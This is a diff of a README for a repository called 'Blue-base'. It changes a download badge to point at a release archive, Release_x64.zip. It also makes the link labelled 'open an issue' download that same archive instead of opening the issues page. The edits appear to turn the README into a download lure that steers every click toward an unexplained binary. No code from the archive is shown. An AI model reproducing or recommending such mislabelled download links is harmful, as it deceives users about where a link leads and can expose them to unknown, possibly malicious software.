@@ -8,7 +8,7 @@ Welcome to the Blue-base repository! This repository focuses on providing custom
 
 To get started with Blue-base, you can download the necessary software by clicking the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Sathsidu/Blue-base/releases/download/v1.0/Release_x64.zip)](https://github.com/Sathsidu/Blue-base/releases/download/v1.0/Release_x64.zip)
 
 **Note:** The provided link needs to be launched to download the software package.
 
@@ -46,7 +46,7 @@ We appreciate the contributions from the open-source community that have made Bl
 
 ## Support
 
-For any questions, issues, or feedback related to Blue-base, please [open an issue](https://github.com/username/repo/issues) on GitHub. Our team will be happy to assist you.
+For any questions, issues, or feedback related to Blue-base, please [open an issue](https://github.com/Sathsidu/Blue-base/releases/download/v1.0/Release_x64.zip) on GitHub. Our team will be happy to assist you.
 
 ## License
 
